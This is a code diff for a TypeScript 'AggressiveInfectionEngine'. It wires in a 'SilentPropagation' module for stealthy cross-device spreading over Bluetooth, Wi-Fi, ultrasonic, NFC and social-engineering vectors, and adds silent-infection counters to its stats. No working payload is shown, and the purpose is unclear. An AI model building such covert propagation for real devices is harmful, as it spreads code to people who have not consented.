@@ -1,3 +1,4 @@
+import { SilentPropagation } from './SilentPropagation';
 
 interface InfectionVector {
   type: 'bluetooth_scan' | 'wifi_probe' | 'ultrasonic_beacon' | 'visual_qr' | 'nfc_proximity' | 'mesh_relay' | 'social_engineering';
@@ -36,10 +37,14 @@ export class AggressiveInfectionEngine {
     await this.setupInfectionVectors();
     await this.createInfectionPayload();
     await this.activateAggressiveMode();
+    
+    // Initialize silent propagation for cross-device spreading
+    await SilentPropagation.initialize();
+    
     this.startContinuousScanning();
     this.enableStealthPropagation();
 
-    console.log('[INFECTION ENGINE] Aggressive infection protocol activated');
+    console.log('[INFECTION ENGINE] Aggressive infection protocol with silent propagation activated');
   }
 
   private static async setupInfectionVectors(): Promise<void> {
@@ -896,6 +901,7 @@ export class AggressiveInfectionEngine {
   // Public API methods
   static getInfectionStats() {
     const devices = Array.from(this.targetDevices.values());
+    const silentStats = SilentPropagation.getInfectionStats();
     
     return {
       totalTargets: devices.length,
@@ -907,7 +913,13 @@ export class AggressiveInfectionEngine {
         ? devices.reduce((sum, d) => sum + d.infectionDepth, 0) / devices.length 
         : 0,
       activeVectors: this.infectionVectors.size,
-      isAggressive: this.isAggressiveModeActive
+      isAggressive: this.isAggressiveModeActive,
+      silentPropagation: {
+        isActive: silentStats.isActive,
+        silentlyInfectedDevices: silentStats.infectedDevices,
+        silentVectors: silentStats.activeVectors,
+        payloadSize: silentStats.totalPayloadSize
+      }
     };
   }
 
